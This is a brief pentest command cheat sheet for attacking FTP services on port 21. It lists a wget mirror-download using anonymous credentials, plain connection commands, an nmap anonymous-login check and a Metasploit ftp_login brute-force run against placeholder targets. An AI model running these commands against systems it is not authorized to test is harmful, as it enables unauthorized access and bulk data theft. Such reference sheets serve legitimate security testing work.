# FTP

% ftp, 21
#plateform/linux  #target/remote  #port/21 #protocol/ftp 

## ftp - download all 
#cat/ATTACK/FILE_TRANSFERT 
```
wget -m ftp://anonymous:anonymous@<IP>
```

## ftp download all (2)
#cat/ATTACK/FILE_TRANSFERT
```
wget -m --no-passive ftp://anonymous:anonymous@<IP>
```

## ftp - connect
#cat/ATTACK/CONNECT
```
ftp <IP>
```

## ftp - connect port
#cat/ATTACK/CONNECT
```
ftp <IP> <PORT>
```

## ftp - enum anonym
#cat/ATTACK/CONNECT
```
nmap -v -p 21 --script=ftp-anon.nse <IP>
```

## ftp - msf bruteforce login
#cat/ATTACK/BRUTEFORCE-SPRAY
```
msfconsole -x 'use auxiliary/scanner/ftp/ftp_login; set RHOSTS <IP>; set USER_FILE <user_file>; set PASS_FILE <password_file>; exploit'
```

